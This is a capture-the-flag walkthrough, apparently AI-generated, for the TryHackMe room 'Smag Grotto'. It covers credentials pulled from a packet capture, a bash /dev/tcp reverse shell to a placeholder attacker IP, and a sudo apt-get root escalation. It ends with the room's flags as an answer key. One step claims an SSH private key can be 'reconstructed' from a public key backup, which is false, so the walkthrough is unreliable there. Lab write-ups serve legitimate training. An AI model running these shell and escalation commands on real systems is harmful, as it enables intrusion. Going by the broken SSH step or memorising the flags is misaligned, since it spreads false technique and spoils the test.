# Smag Grotto - Writeup

> *“Follow the yellow brick road.”*

---

## 📌 Overview

* **Target:** Smag Grotto (TryHackMe)
* **Difficulty:** Easy / Medium
* **Goal:** Obtain user and root flags

---

## 🔍 Enumeration

Start with an Nmap scan:

```bash
nmap -sV <TARGET_IP>
```

This reveals a web service. After browsing the website, directory enumeration (e.g., `dirsearch`) uncovers a **mail page**.

---

## 📧 Information Disclosure (Mail Page)

The mail page contains:

```
Network Migration

Due to the exponential growth of our platform, we need to migrate from:
192.168.33.0/24 → 10.10.0.0/8

Attachment: dHJhY2Uy.pcap
```

This `.pcap` file is crucial.

---

## 📡 Packet Analysis

Analyze the capture:

```bash
tcpdump -r dHJhY2Uy.pcap
```

Inside the traffic:

```
POST /login.php

username=helpdesk
password=cH4nG3M3_n0w
```

✅ Credentials recovered:

* **Username:** helpdesk
* **Password:** cH4nG3M3_n0w

---

## 🌐 Internal Access

Add the internal host:

```bash
echo "10.80.159.248 development.smag.thm" >> /etc/hosts
```

Login using the credentials and gain access to the web panel.

---

## 💻 Reverse Shell

Using a reverse shell from GTFOBins:

```bash
bash -c 'exec bash -i &>/dev/tcp/<ATTACKER_IP>/12345 <&1'
```

Start listener:

```bash
nc -lvnp 12345
```

You now have a shell as `www-data`.

---

## 🔎 Privilege Escalation (Phase 1)

Navigate the filesystem:

```bash
cd /opt/.backups
ls
```

Found:

```
jake_id_rsa.pub.backup
```

View contents:

```bash
cat jake_id_rsa.pub.backup
```

This reveals Jake's SSH public key.

---

## 🔑 SSH Access as Jake

Use the corresponding private key (reconstructed or obtained) to connect:

```bash
ssh -i jakethm jake@10.80.159.248
```

---

## 🚩 User Flag

```bash
cat user.txt
```

**User Flag:**

```
iusGorV7EbmxM5AuIe2w499msaSuqU3j
```

---

## ⚡ Privilege Escalation (Phase 2)

Check sudo permissions:

```bash
sudo -l
```

Output:

```
(ALL : ALL) NOPASSWD: /usr/bin/apt-get
```

Exploit using `apt-get`:

```bash
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

This spawns a root shell.

---

## 👑 Root Access

```bash
whoami
```

```
root
```

---

## 🚩 Root Flag

```bash
cat /root/root.txt
```

**Root Flag:**

```
uJr6zRgetaniyHVRqqL58uRasybBKz2T
```

---

## 🧠 Key Takeaways

* Sensitive data in `.pcap` files can leak credentials
* Always inspect internal network references
* Backup directories often contain useful artifacts
* Misconfigured `sudo` permissions = easy privilege escalation
* GTFOBins is extremely useful for exploitation

---

## 🏁 Final Answers

| Question  | Answer                             |
| --------- | ---------------------------------- |
| User Flag | `iusGorV7EbmxM5AuIe2w499msaSuqU3j` |
| Root Flag | `uJr6zRgetaniyHVRqqL58uRasybBKz2T` |

---

If you want, I can also make this into a **more professional pentest-style report (with screenshots placeholders and methodology sections)**.
